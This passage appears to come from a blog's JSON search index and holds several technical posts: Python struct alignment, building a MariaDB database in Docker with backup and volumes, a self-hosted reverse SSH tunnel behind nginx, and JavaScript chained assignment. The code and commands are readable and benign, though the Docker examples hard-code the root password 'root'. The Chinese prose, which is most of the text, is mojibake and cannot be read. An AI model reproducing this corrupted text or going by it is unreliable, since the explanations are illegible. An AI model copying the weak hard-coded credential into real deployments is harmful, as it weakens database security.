`\\x01\\x00\\x00\\x00abc\\x00\\x01\\x00\\x00\\x00` -> `12 bytes`\n\næ–¼æ˜¯ä½¿ç”¨ calcsize ç¢ºèªä¸€ä¸‹\n\n```python\nstruct.calcsize(\"I3sI\")\n# 12\n```\n\nçš„ç¢ºä¹Ÿæ˜¯ `12 bytes`ï¼Œè€Œä¸”å¯ä»¥ç™¼ç¾çš„æ˜¯ï¼Œæ˜¯ä¸­é–“çš„å­—ä¸²è®Šæˆäº† `4 bytes`\n\næ–¼æ˜¯å¯¦é©—äº†ä¸€ä¸‹ï¼š\n\n```python\nstruct.calcsize(\"3s\")\n# 3\nstruct.calcsize(\"3sI\")\n# 8\nstruct.calcsize(\"4sI\")\n# 8\nstruct.calcsize(\"5sI\")\n# 12\n```\n\nå¯ä»¥ç™¼ç¾ `3s` çš„ç¢ºæ˜¯ `3 bytes`ï¼Œä½†æ˜¯ç•¶å¾Œé¢é‚„æœ‰æœ‰å…¶ä»– bytes çš„è©±ï¼Œå‰‡æœƒè£œé½Š `4 bytes`ï¼Œç„¶è€Œæˆ‘ç”¨ `4sI` å¯ä»¥ç™¼ç¾é‚„æ˜¯ `8 bytes` ç„¡èª¤ã€‚\n\nç¬¬ä¸€å€‹ç›´è¦ºå°±æ˜¯çŒœæƒ³ï¼Œæ˜¯ä¸æ˜¯ struct è‡ªå‹•åšäº† word å¤§å°ç‚º 4 çš„å°é½Šã€‚\n\næŸ¥äº†ä¸€ä¸‹æ–‡ä»¶\n\n> By default, C types are represented in the machineâ€™s native format and byte order, and properly aligned by skipping pad bytes if necessary (according to the rules used by the C compiler).\n\nåˆ°é€™é‚ŠçœŸç›¸å·²ç¶“å¤§ç™½ï¼Œä½†æ˜¯é‚„æ˜¯æ²’è§£æ±ºå•é¡Œ\n\né€™å€‹å•é¡Œçš„è§£æ³•å°±æ˜¯åœ¨ fmt å‰é¢è£œä¸Šä¸€äº›ç¬¦è™Ÿä¾†å‘Šè¨´ struct æ¨¡çµ„éœ€ä¸éœ€è¦è‡ªå‹•åšå°é½Š\n\n```python\nstruct.pack(\"3sI\", b'abc', 1)\n# b'abc\\x00\\x01\\x00\\x00\\x00'\nstruct.pack(\"@3sI\", b'abc', 1)\n# b'abc\\x00\\x01\\x00\\x00\\x00'\n# ä»¥ä¸Šå…©é€±æ˜¯ä¸€æ¨£çš„ï¼Œé è¨­å°±æ˜¯ç”¨ @ï¼Œä»£è¡¨è‡ªå‹•å°é½Š\n\nstruct.pack(\"=3sI\", b'abc', 1)\n# b'abc\\x01\\x00\\x00\\x00'\n# ä½¿ç”¨ =ï¼Œä»£è¡¨ä¸å•Ÿå‹•å°é½Š\n```\n\næ–‡ä»¶é‚„æœ‰è²¼å¿ƒçš„å¯«ä¸‹\n\n> The form '!' is available for those poor souls who claim they canâ€™t remember whether network byte order is big-endian or little-endian.\n\n```python\nstruct.pack(\"!3sI\", b'abc', 1)\n# b'abc\\x00\\x00\\x00\\x01'\nstruct.pack(\">3sI\", b'abc', 1)\n# b'abc\\x00\\x00\\x00\\x01'\n# ä½¿ç”¨ç¶²è·¯ç›¸é—œå‚³è¼¸å¯ä»¥ç›´æ¥ç”¨ !ï¼Œçœå»è¨˜ä¸‹ç¶²è·¯å‚³è¼¸æ˜¯ big-endian\nstruct.pack(\"<3sI\", b'abc', 1)\n# b'abc\\x01\\x00\\x00\\x00'\n```\n\né€™äº›ç¬¦è™Ÿç¸½å…±æœ‰ `@`, `=`, `<`, `>`, `!`ï¼Œæœ‰èˆˆè¶£å¯ä»¥åˆ°[å®˜æ–¹æ–‡ä»¶](https://docs.python.org/3.8/library/struct.html#struct-alignment)äº†è§£ã€‚æœ‰è¶£çš„æ˜¯åªæœ‰ç¬¬ä¸€å€‹(`@`)ï¼Œä¹Ÿå°±æ˜¯é è¨­çš„æ¨¡å¼æœƒæ¡ç”¨è‡ªå‹•å°é½Šï¼\n","tags":["socket","python"]},{"title":"ä½¿ç”¨ docker ä¾†è¼•é¬†å»ºæ§‹è³‡æ–™åº«","url":"/2019/10/21/","content":"\n## ç·£èµ·\n\nè‡ªå¾ä½¿ç”¨äº† Docker ä¹‹å¾Œï¼Œå‡¡æ˜¯éœ€è¦æ¸¬è©¦æ–°çš„æœå‹™æˆ–æ˜¯æŠŠç©æ–°çš„å·¥å…·ç¬¬ä¸€å€‹ç›´è¦ºå°±æ˜¯å»æ‰¾æœ‰æ²’æœ‰ docker imageã€‚\n\nç„¶è€Œæœ€è¿‘å‰›å¥½æ‰‹é‚Šæœ‰ä¸€å€‹ LINE Nofity ä¸²æ¥çš„æ¡ˆå­ï¼Œè¦ç®¡ç†ä¸åŒä½¿ç”¨è€…çš„ token éœ€è¦ä¸€å€‹è³‡æ–™åº«ä¾†å„²å­˜ä¸¦ä¸”ç®¡ç†ï¼Œæ–¼æ˜¯æ‰“ç®—å°‡è³‡æ–™åº«åŒ…é€² Dockerï¼Œæ–¹ä¾¿æ—¥å¾Œéƒ¨ç½²æˆ–æ˜¯å‚™ä»½æª”æ¡ˆã€‚\n\nåœ¨æ‰“åŒ…çš„éç¨‹ä¸­å­¸ç¿’åˆ°äº†ä¸€äº›çŸ¥è­˜ï¼Œè¨˜éŒ„èµ·ä¾†æ–¹ä¾¿æ—¥å¾ŒæŸ¥è©¢ç”¨ï¼Œç•¢ç«Ÿ Docker file ä¸æ˜¯å¤©å¤©å¯«ï¼Œæ™‚å¸¸æœƒå¿˜è¨˜ã€‚\n\n## ç›®æ¨™\n\nå¸Œæœ›å°‡ container è·‘èµ·ä¾†æ™‚ï¼Œè£¡é¢çš„ database æ˜¯å·²ç¶“å®šç¾©å¥½ Schema çš„æƒ…æ³ï¼Œè®“å¾Œç«¯æœå‹™å¯ä»¥ç›´æ¥é€²è¡Œäº’å‹•ã€‚é•·æœŸç›®æ¨™æ˜¯é€£è³‡æ–™åº«å…§å®¹éƒ½è¦æ˜ å°„åˆ° container ä¹‹å¤–ï¼Œæ–¹ä¾¿æ—¥å¾Œç§»è½‰ã€‚ä¸éé€™ç¯‡æ–‡ç« ä¸æœƒæåˆ°ã€‚\n\n## Docker é‚£äº›å®¹æ˜“æ··æ·†çš„äº‹\n\næœ€å®¹æ˜“ææ··çš„æ‡‰è©²å°±æ˜¯ `RUN`, `CMD`, `ENTRYPOINT` é€™ä¸‰å€‹è¨­å®šå€¼\n\n`RUN` é€šå¸¸ç”¨ä¾†å®‰è£å¥—ä»¶ï¼Œåƒæ˜¯ç”¨ä¾†åŸ·è¡Œ apt ç›¸é—œæŒ‡ä»¤\n\n`CMD` ç”¨ä¾†åŸ·è¡Œå•Ÿå‹• container ä¹‹å¾Œçš„æŒ‡ä»¤ï¼Œä½†ä»–å¯ä»¥è¢« `docker run` ä¹‹å¾Œçš„åƒæ•¸ä¾†å–ä»£ï¼Œä¹Ÿå°±æ˜¯ `docker run` å¾Œé¢ä¸åŠ ä¸Šä½¿ç”¨è€…è‡ªè¨‚çš„å‘½ä»¤ï¼Œå°±æœƒåŸ·è¡Œ `CMD` çš„å…§å®¹\n\n`ENTRYPOINT` è·Ÿ `CMD` é¡ä¼¼ï¼Œä½†æ˜¯å…§å®¹ä¸æœƒè¢« `docker run` å¾Œé¢çµ¦çš„æŒ‡ä»¤è¦†è“‹æ‰ï¼Œé‚£äº›æŒ‡ä»¤æœƒé™„åŠ åœ¨ `ENTRYPOINT` ä¹‹å¾Œ\n\né™¤æ­¤ä¹‹å¤–å°‡æª”æ¡ˆè¤‡è£½é€² container è¦ç”¨ `COPY` é‚„æ˜¯ `ADD` ä¹Ÿæœ‰ä¸€äº›ä¸åŒçœ‹æ³•ã€‚`ADD` åŸºæœ¬ä¸Šå°±æ˜¯ `COPY` çš„å¢å¼·ç‰ˆï¼Œé™¤äº†å¯ä»¥å°‡æª”æ¡ˆè¤‡è£½é€²å®¹å™¨ï¼Œä¹Ÿå¯ä»¥å¡«å…¥ä¸€ä¸²ç¶²å€ã€‚å¦‚æœå¡«å…¥çš„ä¾†æºæ˜¯å£“ç¸®æª”ï¼Œé‚£éº¼æœƒè‡ªå‹•é€²è¡Œå£“ç¸®ã€‚\n\næ‰€ä»¥æ²’æœ‰ç‰¹åˆ¥éœ€æ±‚çš„è©±ï¼Œå–®ç´”æƒ³è¤‡è£½æª”æ¡ˆé€²å®¹å™¨ï¼Œé‚„æ˜¯æ¨è–¦ç”¨ `COPY` æ¯”è¼ƒç°¡å–®æ˜ç­ä¸€é»ã€‚\n\n## æ’°å¯« Docker file\n\n```docker\nFROM mariadb:10.4.8\nCOPY init.sql /docker-entrypoint-initdb.d/\nENV MYSQL_ROOT_PASSWORD root\nENV MYSQL_DATABASE token_db\nEXPOSE 3306\n```\n\nåœ¨æ’°å¯« Docker file æ™‚ï¼Œè¨˜å¾— image è¦é™„ä¸Šç‰ˆæœ¬ï¼Œå¦å‰‡é è¨­æ˜¯ latestã€‚å¾€å¾Œéƒ¨ç½²åˆ°å…¶ä»–ä¼ºæœå™¨æœ‰å¯èƒ½æœ€æ–°ç‰ˆæœ¬å·²ç¶“ä¸å†æ˜¯é€™ä¸€ç‰ˆäº†ï¼Œæ­¤æ™‚å°±å¯èƒ½å‡ºç¾ä¸åŒç‰ˆæœ¬è¡Œç‚ºä¸ä¸€çš„æƒ…æ³ã€‚å»ºè­°ä¸€å®šè¦æŒ‡å®šç‰ˆæœ¬è™Ÿã€‚\n\næˆ‘æƒ³è¦åœ¨å®¹å™¨è·‘èµ·ä¾†æ™‚è‡ªå‹•å°‡ database schema ä¹Ÿä¸€ä½µå‰µå»ºå¥½ï¼Œæ­¤æ™‚å¯ä»¥å°‡ä½ çš„ .sql æª”æ¡ˆæ”¾å…¥ `/docker-entrypoint-initdb.d` é€™å€‹ç›®éŒ„ï¼Œæ­¤ç›®éŒ„ä¸­çš„ .sql æª”æ¡ˆæœƒåœ¨è³‡æ–™åº«å•Ÿå‹•æ™‚è‡ªå‹•è¢«åŸ·è¡Œ(åœ¨ MySQL image ä¹Ÿæ˜¯)ï¼Œå¦‚æ­¤ä¸€ä¾†å¯ä»¥çœä¸‹ä¸å°‘å¯« script å»è‡ªå‹•è¡¨æ ¼çš„æ™‚é–“ã€‚\n\næ¥ä¸‹ä¾†è¨­å®šå¥½ç’°å¢ƒè®Šæ•¸è®“ä½ çš„ MariaDB \b è‡ªå‹•å»ºç«‹å¥½è³‡æ–™åº«ä»¥åŠè¨­å®š root å¯†ç¢¼ï¼Œè©³ç´°æœ‰å“ªäº›ç’°å¢ƒè®Šæ•¸å¯ä»¥è¨­å®šï¼Œåœ¨ [MariaDB çš„ image æ–‡ä»¶ä¸­](https://hub.docker.com/_/mariadb)ã€‚\n\n## å‚™ä»½èˆ‡å¾©åŸ\n\nä½¿ç”¨å®¹å™¨éƒ¨ç½²æœå‹™æ™‚ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°‡æœå‹™é€²è¡Œè½‰ç§»ã€‚ä½†ä»Šå¤©çš„æœå‹™æ˜¯è³‡æ–™åº«ï¼Œæœ‰æ™‚å€™æˆ‘å€‘å¸Œæœ›å°‡è³‡æ–™åº«çš„å…§å®¹å¾å®¹å™¨å…§å‚™ä»½å‡ºä¾†ï¼Œæ‰ä¸æœƒå› ç‚ºå®¹å™¨æ„å¤–åœæ­¢äº†è€Œéºå¤±è³‡æ–™ã€‚\n\nåšåˆ°é€™ä»¶äº‹æƒ…çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå¯ä»¥æ›è¼‰ç›®éŒ„ä½ç½®é€²å®¹å™¨ï¼Œé€éé€™æ¨£çš„æ–¹å¼å°‡è³‡æ–™åº«ç›¸é—œçš„æª”æ¡ˆèˆ‡å®¹å™¨å¤–çš„ä¸»æ©Ÿå…±ç”¨ã€‚ä½†ä»Šå¤©ä½¿ç”¨çš„æ–¹å¼æ˜¯ä½¿ç”¨ `MySQL` æä¾›çš„ `mysqldump` æŒ‡ä»¤ä¾†å°‡è³‡æ–™åº«å…§å®¹å‚™ä»½ã€‚\n\n### å‚™ä»½\n\n`docker exec <cotainer-id> /usr/bin/mysqldump -u root --password=root <db-name> > backup.sql`\n\n`backup.sql` çš„åç¨±å¯ä»¥éš¨æ„å‘½åï¼Œå®ƒæ˜¯å°‡è³‡æ–™åº«å…§å®¹åŒ¯å‡ºçš„ sql æª”æ¡ˆã€‚\n\n### å¾©åŸ\n\n`cat backup.sql | docker exec -i <cotainer-id> /usr/bin/mysql -u root --password=root <db-name>`\n\nå‚™ä»½èˆ‡å¾©åŸå¯ä»¥å¹«åŠ©ä½ åœ¨è½‰ç§»æœå‹™åˆ°å…¶ä»–ä¸»æ©Ÿæ™‚ï¼Œå…ˆå°‡åŸæœ¬æœå‹™çš„è³‡æ–™åº«å…§å®¹å–å‡ºï¼Œä¸¦ä¸”åœ¨å…¶ä»–ä¸»æ©Ÿå›å¾©å…§å®¹ã€‚\n\n## æŒä¹…åŒ–å„²å­˜\n\nä»¥ä¸Šæ–¹æ³•å¾ˆæ˜é¡¯æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯ä½ ç„¡æ³•å¾—çŸ¥ container åœ¨å“ªä¸€å€‹æ™‚å€™é‡åˆ°æ„å¤–è€Œçµ‚æ­¢ï¼Œé€™æ¨£å­ä¹Ÿç„¡æ³•åœ¨é©ç•¶çš„æ™‚æ©Ÿå‚™ä»½ï¼Œæœ‰å¯èƒ½é€ æˆè³‡æ–™éºå¤±ï¼\n\næƒ³è¦é”æˆæŒä¹…åŒ–å„²å­˜å‹¢å¿…è¦ä½¿ç”¨åˆ° `VOLUME` åŠŸèƒ½ï¼Œé™¤æ­¤ä¹‹å¤–é‚„éœ€è¦ä¸€å€‹èƒŒæ™¯çŸ¥è­˜ï¼ŒmariaDBï¼ˆMySQLï¼‰çš„è³‡æ–™å„²å­˜ä½ç½®åœ¨ `/var/lib/mysql`ã€‚\n\nè¦é”æˆæ›è¼‰çš„æ–¹å¼æœ‰å¾ˆå¤šç¨®ï¼Œåœ¨æ­¤ä½¿ç”¨å€‹äººè¦ºå¾—è¼ƒç‚ºç›´è¦ºçš„ä¸€ç¨®ï¼š\n\næ–°å¢ä¸€å€‹ volume çµæ§‹ä¸¦å‘½åç‚º `db-data`\n\n`docker create volume db-data`\n\nä¹‹å¾Œå°‡å®¹å™¨è·‘èµ·ä¾†æ™‚ï¼ŒæŒ‡å®šå®¹å™¨å…§éƒ¨çš„å“ªä¸€å€‹ä½ç½®éœ€è¦å¾€å¤–æ›è¼‰è‡³ `db-data`\n\n`docker run -it -d -v db-data:/var/lib/mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root db`\n\nå¦‚æ­¤ä¸€ä¾†ï¼Œå®¹å™¨å…§çš„ `/var/lib/mysql` æ˜ å°„è‡³å¤–éƒ¨çš„ `db-data`ï¼Œä¸ç®¡å®¹å™¨å­˜åœ¨èˆ‡å¦ `db-data` éƒ½æœƒå­˜åœ¨ï¼\n\næˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨ `docker volume inspect db-data` ä¾†æŸ¥çœ‹è©² `VOLUME` çš„è³‡è¨Š\n\n```\n[\n    {\n        \"CreatedAt\": \"2019-11-14T02:17:21Z\",\n        \"Driver\": \"local\",\n        \"Labels\": {},\n        \"Mountpoint\": \"/var/lib/docker/volumes/db-data/_data\",\n        \"Name\": \"db-data\",\n        \"Options\": {},\n        \"Scope\": \"local\"\n    }\n]\n```\n\nå¯ä»¥ç™¼ç¾å®ƒåœ¨æœ¬æ©Ÿä½ç½®çš„çœŸå¯¦è·¯å¾‘ç‚º `/var/lib/docker/volumes/db-data/_data`ã€‚\n\n## å¾Œè¨˜\n\næœ‰äº† Docker ä¹‹å¾Œè®“å¾ˆå¤šäº‹æƒ…è®Šå¾—å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯è‡ªå·±åœ¨å­¸ç¿’æ’°å¯« Dockerfile çš„éç¨‹ä¸­ä»¥åŠéƒ¨ç½² Docker æœå‹™æ™‚ï¼Œæ™‚å¸¸è¢«ä¸€äº›é¡ä¼¼çš„æŒ‡ä»¤èˆ‡è¡Œç‚ºææ··ã€‚å¸Œæœ›è—‰ç”±è¨˜éŒ„å»ºæ§‹ç’°å¢ƒæµç¨‹ï¼Œä¸€æ–¹é¢åŠ æ·±è‡ªå·±å°è±¡ï¼Œä¸€æ–¹é¢è®“æ›´å¤šæœ‰é¡ä¼¼éœ€æ±‚çš„å¤¥ä¼´å¯ä»¥åƒè€ƒ ğŸ˜Š\n","tags":["docker"]},{"title":"ä¸ç”¨ä»»ä½•å·¥å…·ï¼å…§ç¶²ç©¿é€è‡³è‡ªå·±çš„åŸŸåä¸‹","url":"/2019/09/08/","content":"\n## å‰è¨€\n\n> ä¸ä¹…å‰æ‰å¯«äº†ä¸€ç¯‡ [ç”¨ serveo ä¾†ç©¿é€å…§ç¶²å§](https://blog.yiyu0x.tk/2019/06/03/%E7%94%A8-serveo-%E4%BE%86%E7%A9%BF%E9%80%8F%E5%85%A7%E7%B6%B2%E5%90%A7/)ï¼Œçµæœé¦¬ä¸Šå°±è¦æ‰“è‡‰è‡ªå·±äº† ğŸ‘‹\n\nä¸Šä¸€ç¯‡æ–‡ç« æåˆ° serveo.net æ¯”èµ· ngrok å¯ä»¥è‡ªè¨‚ sub domain ï¼Œæ›´åŠ æ–¹ä¾¿ï¼ˆä¸æœƒæ¯ä¸€æ¬¡ç”¢ç”Ÿç¶²å€éƒ½åƒä¸€å †äº‚ç¢¼ä¸€æ¨£ä¸æ–¹ä¾¿è¨˜æ†¶ï¼‰ã€‚ä½†æ˜¯è‡ªå·±åœ¨é€™ä¸€é™£å­ä½¿ç”¨ä¸‹ç™¼ç¾ï¼Œserveo.net çš„ç¶²ç«™ä¼¼ä¹å¸¸å¸¸æ›æ‰ï¼Œè€Œä¸”æ‰“é€š reverse ssh çš„é€Ÿåº¦ä¼¼ä¹æ²’æœ‰ ngrok ä¾†å¾—å¿«ï¼\n\nä½†æ˜¯ä»–çš„æŒ‡ä»¤ `ssh -R 80:localhost:3000 serveo.net` è®“æˆ‘è®“æˆ‘éˆæ©Ÿä¸€å‹•ï¼Œåæ­£éƒ½æ˜¯ reverse sshã€‚åªè¦æœ‰è‡ªå·±çš„ domain ä»¥åŠè‡ªå·±çš„ vpsï¼Œæˆ‘ä¹Ÿèƒ½è‡ªå·±æ¶è¨­ã€‚\n\nè¨­å®šå¥½ domain å†ä½¿ç”¨ reverse proxyï¼Œç­‰åˆ°éœ€è¦æ™‚å†æ‰“ä¸€æ¢ reverse ssh ä¼¼ä¹ä¹Ÿä¸æ˜¯å¤šå›°é›£çš„äº‹ï¼Œæ†‘è­‰çš„äº‹æƒ…äº¤çµ¦ certbot è§£æ±ºå°±å¥½ã€‚\n\n## äº‹å‰æº–å‚™\n\n-   VPS\n-   Domain\n-   NS server è¨­å®šä¸€çµ„ A record æŒ‡å‘ VPS\n-   nginx ï¼ˆç”¨ä¾†åš reverse proxyï¼‰\n\n## æ¶æ§‹\n\n![1](./a.png)\n\n## é–‹å·¥\n\né¦–å…ˆå…ˆåœ¨ `/etc/nginx/sites-available` ä¸‹æ–°å»ºè¨­å®šæª”ï¼Œæª”åå»ºè­°ç”¨ä½ çš„ virtual host ä¾†å‘½åï¼Œåœ¨é€™é‚Šä»¥ reverse èˆ‰ä¾‹\n\n/etc/nginx/sites-available/reverse:\n\n```\nserver {\n  server_name reverse.yiyu0x.tk; #æ”¹ç‚ºè‡ªå·±çš„ domain\n  location / {\n      proxy_pass http://localhost:5487/; #è¨­å®šç‚ºå…§ç¶²ä»»æ„ portï¼Œåˆ°æ™‚å€™ç”¨ä¾†æ‰“ reverse ssh\n  }\n}\n```\n\nè¨­å®šå®Œç•¢ä¹‹å¾Œï¼Œè¨˜å¾— `ln -s` è‡³ `/etc/nginx/sites-enable` ä¸¦ä¸”é‡æ–°å•Ÿå‹• nginx ï¼ˆå•Ÿå‹•å‰å¯ä»¥ç”¨ nginx -t ä¾†æª¢æŸ¥æ˜¯å¦æœ‰èªæ³•éŒ¯èª¤ï¼‰\n\nï¼ˆå¦‚æœä½ çš„å…§ç¶²ç©¿é€éœ€è¦ httpsï¼Œå¯ä»¥ç”¨ certbot ä¾†è¼•é¬†å¹«ä½ æ–°å¢å…è²»æ†‘è­‰ä¸¦ä¸”ç®¡ç†æ†‘è­‰ï¼‰\n\nåšåˆ°é€™é‚Šå·²ç¶“å®Œæˆäº†ä¸€åŠï¼Œæ¥ä¸‹ä¾†å°±å‰©ä¸‹æ‰“é€šé“äº†ï¼\n\n`ssh -R 5487:localhost:1234 user@domain.com`\n\nå‰é¢çš„ 5487 ä»£è¡¨é ç«¯çš„ portï¼Œçœ‹ä½ å‰é¢è¨­å®šå¤šå°‘é€™é‚Šå°±ç”¨å¤šå°‘ï¼Œå› ç‚ºè¦èˆ‡ VPS ä¸Šé–‹çš„ port ç¶å®šï¼Œæ‰€ä»¥å»ºè­°è¨­å®šä¸€çµ„è‡ªå·±è¨˜å¾—èµ·ä¾†çš„ï¼Œè¨˜å¾—é ç«¯çš„é˜²ç«ç‰†è¦æ‰“é–‹ï¼\n\nä½†æ˜¯æŒ‡ä»¤é€™éº¼é•·ï¼Œéå¸¸é›£è¨˜æ†¶ï¼Œå¦‚æœé€™ç¯‡æ–‡ç« åªæœ‰é€™æ¨£å­æˆ‘æƒ³å¤§å®¶é‚„æ˜¯æœƒå›å»ç”¨ ngrok æˆ–æ˜¯ serveo.netã€‚\n\nåœ¨ä½¿ç”¨ ssh æœå‹™æ™‚ï¼Œå¯ä»¥ä½¿ç”¨é‡‘é‘°ä¾†é”æˆå…å¯†ç¢¼ç™»å…¥ã€‚ä»¥åŠåœ¨ `~/.ssh/config` ä¸‹æ–°å¢è¨­å®šä¾†ç°¡åŒ–ç™»å…¥ ssh æµç¨‹\n\nä¾‹å¦‚:\n\n```\nHost <vps-name>         #è‡ªè¡Œè¨­å®šæƒ³è¦çš„åç¨±\n    hostname <vps-ip>   #vps ip ä½ç½®\n    user <name>         #é ç«¯ä½¿ç”¨è€…åç¨±\n    IdentityFile <path> #ç§é‘°ä½ç½®\n```\n\nè¨­å®šå®Œç•¢ä¹‹å¾Œï¼ŒæŒ‡ä»¤å¯ä»¥ç°¡åŒ–ç‚º\n\n`ssh -R 5487:localhost:1234 vps-name`\n\nä½†æ˜¯é€™æ¨£é‚„æ˜¯ä¸å¤ å¥½ï¼æˆ‘å€‘åœ¨ local çš„ port å¯èƒ½æœƒå› ç‚ºæ¯ä¸€å€‹æœå‹™ä¸åŒè€Œéœ€è¦ç©¿é€ä¸åŒçš„ portã€‚\n\næ–¼æ˜¯æˆ‘å€‘å¯ä»¥é€éä¿®æ”¹ `~/.bashrc` ä¾†è¨­å®š alias\n\n```bash\nalias rev-ssh='rev-ssh'\nfunction rev-ssh() {\n\tssh -R 5487:localhost:$1 y-gcp\n}\n```\n\nè¨­å®šå®Œä¹‹å¾Œï¼Œè¨˜å¾—ä¸‹ `source ~/.bashrc` ä¾†è®“ bash é‡æ–°è®€å–ä¸€æ¬¡è¨­å®šæª”\n\nå¦‚æ­¤ä¸€ä¾†ï¼ŒæŒ‡ä»¤ç°¡åŒ–ç‚º `rev-ssh <your-port>`\n\n## é©—æ”¶\n\nå¯ä»¥é€é `python3 -m http.server 6666` åœ¨ç•¶ä¸‹ç›®éŒ„é–‹ä¸€å€‹ http æœå‹™ä¾†ç€è¦½æª”æ¡ˆ\n\nå†ä½¿ç”¨ `rev-ssh 6666` ä¾†å°‡ local çš„ 6666 port æ‰“ä¸€æ¢ reverse ssh è‡³è‡ªå·±çš„ vpsï¼ˆæŒ‰ç…§æˆ‘ä»¥ä¸Šçš„è¨­å®šå°±æ˜¯ reverse.yiyu0x.tkï¼‰\n\nç¾åœ¨å°±å¯ä»¥èˆ‡ ngrok å’Œ serveo.net æ­£å¼å†è¦‹ã€‚å†ä¹Ÿä¸æœƒå› ç‚ºé€™å…©å®¶æœå‹™æ›æ‰è€Œæ²’æœ‰è¾¦æ³•ç©¿é€å…§ç¶²äº†ï¼\n\n## åƒè€ƒ\n\n-   [Bash alias å¦‚ä½•å‚³å…¥åƒæ•¸(\\$1)](https://blog.longwin.com.tw/2016/03/linux-bash-alias-take-parameter-2016/)\n","tags":["tools"]},{"title":"Javascript ä¸­çš„é€£çºŒè³¦å€¼","url":"/2019/08/13/","content":"\n# å‰è¨€\n\næ˜¨å¤©åœ¨[å¡æ–¯ä¼¯](https://www.facebook.com/WccCasper/)å¤§å¤§çš„è‡‰æ›¸ä¸Šé¢çœ‹äº†ä¸€å‰‡æœ‰è¶£çš„è²¼æ–‡ã€‚\n\n![img](https://scontent-tpe1-1.xx.fbcdn.net/v/t1.0-9/67839896_808404392889119_7888086461377937408_n.png?_nc_cat=107&_nc_oc=AQnlzSfKJAo7OARVyT-i6gVGCcn-aMyO3IGuVQa7zGx54eVzW7q9goHk9lNSl7k2xKg&_nc_ht=scontent-tpe1-1.xx&oh=cd49adf668fab32c0de54fea69d86ff3&oe=5DCCB80C)\n\né›–ç„¶é¦¬ä¸Šå°±æœ‰äººåœ¨ç•™è¨€ä¸‹æ–¹åˆ†äº«ç­”æ¡ˆäº†ï¼Œä¸éé‚„æ˜¯æƒ³è¨˜éŒ„ä¸€ä¸‹é€™å€‹æœ‰æ„æ€çš„å•é¡Œã€‚\n\næ­£ç¢ºçš„æ¦‚å¿µæ˜¯ b = c ä¸¦ä¸”é€™æ¢ statement æœ¬èº«æœƒæœ‰ä¸€å€‹å›å‚³å€¼ (æœƒæ˜¯ c çš„å€¼)ï¼Œç„¶å¾Œ a æ”¶åˆ°çš„å…¶å¯¦æ˜¯é€™å€‹å›å‚³å€¼ã€‚\n\nä½†æ˜¯é€™çœ‹èµ·ä¾†ä¼¼ä¹èˆ‡ b = c, a = b çš„çµæœä¸€æ¨£ï¼Œè€Œä¸”ä¹Ÿæ²’ä»€éº¼è¾¦æ³•å¯ä»¥ç”¨å¯¦é©—å»è­‰æ˜ã€‚(é™¤äº†è‡ªå·±åœ¨ console ä¸Šé¢åˆ†è§£å‹•ä½œå¤–)\n\né™„ä¸Šä¸€å€‹åœ¨ console ä¸Šçš„å°çš„å¯¦é©—ï¼š\n\n```javascript\nWelcome to Node.js v12.7.0.\nType \".help\" for more information.\n> a=0, b=0, c=1 // åˆå§‹åŒ–\n1\n> a = b = c\n1\n> a\n1\n> b             // å¯ä»¥ç™¼ç¾ a, b éƒ½æ‹¿åˆ°äº†èˆ‡ c ä¸€æ¨£çš„å€¼\n1\n> b = c         // å¯¦éš›ä¸Š b = c æœƒå…ˆè¢«åŸ·è¡Œ, ä¸¦ä¸”é€™ä¸€å€‹ statement æœƒæœ‰ä¸€å€‹å›å‚³å€¼ 1 (é€™å€‹å›å‚³å€¼ä¹Ÿå°±æ˜¯ c çš„å€¼)\n1\n> a = 1         // æœ€å¾Œ a å…¶å¯¦æ˜¯æ‹¿åˆ° b = c çš„å›å‚³å€¼\n1\n```\n\né‚„æœ‰ä¸€å€‹æœ‰è¶£çš„åœ°æ–¹æ˜¯ä½¿ç”¨ var èˆ‡ let ä¾†åˆå§‹åŒ–ï¼Œå›å‚³å€¼æ˜¯ `undefined`\n\n```javascript\n> let x = 3\nundefined\n> var x2 = 5\nundefined\n```\n\nä¹Ÿæé†’å¤§å®¶ä»¥ä¸‹é€™ä¸€æ¢ statement åªæœ‰ a æ˜¯ let å±¬æ€§ï¼Œå…¶ä»–è®Šæ•¸ (b, c) éƒ½æ˜¯ globalï¼Œä¸è¦ææ··äº†ï¼\n\n```javascript\n> let a = b = c\n```\n\n# PoC\n\nè¬›äº†é€™éº¼å¤šæœ‰ä¸€é»é›¢é¡Œäº†ï¼Œçœ‹ä¸€ä¸‹å®˜æ–¹å…¬å¸ƒçš„è­‰æ˜æ–¹å¼ï¼\n\n![img](https://scontent-tpe1-1.xx.fbcdn.net/v/t1.0-9/67937173_808404412889117_3730474130764464128_n.png?_nc_cat=110&_nc_oc=AQlM7EDX3EI_je0puIbf7NdHSS0MhiqmOseoA4x_zNSKJYnJAz3-HO3a1w5b5rMnAns&_nc_ht=scontent-tpe1-1.xx&oh=43b9752e1340aab1e99364d70c3b3cdd&oe=5DC999B8)\n\nä»¥ä¸Šå°å‡ºçš„æ±è¥¿æ˜¯ `1 {}`\n\né€™å€‹ç°¡å–®çš„é©—è­‰æ–¹å¼å‹éå‰é¢çš„åƒè¨€è¬èªï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ b ä¸¦æ²’æœ‰è¢«å¯«å…¥ä»»ä½•å€¼ï¼Œ a ä¸€æ¨£æ‹¿åˆ°äº† c çš„å€¼ï¼Œè€Œé€™å€‹å€¼å¯¦éš›ä¸Šæ˜¯ b.b = c çš„å›å‚³å€¼(å³ä½¿æ²’æœ‰æˆåŠŸå¯«å…¥ï¼Œé‚„æ˜¯æœƒå›å‚³ c æœ¬èº«çš„å€¼)ã€‚\n\nä¹‹å¾Œæœ‰çœ‹åˆ°é¡ä¼¼å¯«æ³•ï¼Œé›–ç„¶çŸ¥é“çµæœç‚ºä½•ï¼Œä½†åŒæ™‚ä¹Ÿåˆ¥å¿˜äº†ç†è§£èƒŒå¾Œçš„æ¦‚å¿µï¼\n","tags":["javascript"]},{"title":"æ¯å¤©éƒ½åœ¨ Arr.map() ä½ çŸ¥é“ä»€éº¼æ˜¯ functor å—?","url":"/2019/07/18/","content":"\n## å‰è¨€\n\nç¨‹å¼è¨­è¨ˆçš„æ–¹æ³•è«–å¤§é«”ä¾†èªªå¯ä»¥åˆ†ç‚ºå…©ç¨®ï¼Œ `functional programming (FP)` ä»¥åŠ `object oriented programming 